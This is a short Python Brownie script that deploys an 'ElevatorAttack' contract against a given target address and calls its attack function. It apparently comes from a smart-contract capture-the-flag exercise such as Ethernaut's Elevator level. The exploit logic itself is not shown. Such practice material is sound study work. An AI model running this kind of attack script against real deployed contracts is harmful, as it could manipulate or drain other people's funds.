from brownie import accounts, config, ElevatorAttack

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    hack = ElevatorAttack.deploy(target, {'from': hacker})
    hack.attack(10, {'from': hacker, 'allow_revert': True})

    